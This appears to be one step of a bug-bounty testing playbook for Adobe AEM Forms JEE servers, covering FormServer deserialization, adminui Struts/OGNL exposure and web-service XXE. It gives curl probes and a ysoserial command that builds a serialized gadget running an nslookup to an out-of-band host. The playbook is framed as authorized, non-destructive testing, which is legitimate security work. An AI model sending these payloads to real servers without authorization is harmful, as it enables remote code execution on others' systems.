# Batch 14 — AEM Forms modern criticals (Shah / Assetnote)

## objective

On **standalone Forms JEE** smells, check modern unauth critical surfaces: FormServer deserialization, adminui/Struts-devMode class issues, web-service XXE.  
**Strict scope:** only if RCE/XXE allowed. Prefer DNS/HTTP OOB first.

## estimated_time

60–120 minutes

## prerequisites

- Batch 12 classified standalone (or strong FormServer/adminui)
- OAST
- Patch status unknown is OK — still test carefully

## testing_workflow

### 1) Technique A — FormServer GetDocumentServlet presence

```bash
T="https://TARGET"
curl -sk -D- -o /tmp/fs -w "%{http_code}\n" \
  "$T/FormServer/servlet/GetDocumentServlet"
head -c 300 /tmp/fs; echo
```

If endpoint lives, **deser RCE** research path uses `serDoc` = gzip+base64 java gadget (ysoserial).  
Lab-only generation sketch:

```bash
# Authorized lab only — use OOB command
# java -DproperXalan=true -jar ysoserial-all.jar CommonsBeanutils1 "nslookup YOUR-OAST" | gzip | base64 -w0
```

Send as `serDoc` query param URL-encoded. **Do not** run destructive commands.

### 2) Technique B — adminui reachability

```bash
for p in /adminui/ /adminui/login.do /adminui/debug; do
  curl -sk -o /tmp/a -w "%{http_code} %{size_download} $p\n" "$T$p"
done
```

Historical issue class: auth filter bypass + `struts.devMode=true` → OGNL.  
If unauth debug/OGNL endpoints respond, stop and document with minimal PoC per program rules.

### 3) Technique C — edcws / web services XXE (OOB only first)

```bash
curl -sk "$T/edcws/" | head -c 400
# Enumerate listed services; send OOB XXE only, no huge file exfil
```

## decision_points

| If… | Then… |
|-----|--------|
| RCE proven OOB | Critical report; stop further noise |
| Endpoints exposed, exploit fails (patched) | Report attack surface + version advice |
| Not standalone | You should not be in this batch — go **15** |

## expected_findings

- Pre-auth RCE, XXE, critical misconfig on internet-facing Forms

## next_batch_to_continue_with

→ **[15-modern-ssrf-xxe.md](./15-modern-ssrf-xxe.md)** (Sites/modern AEM track)
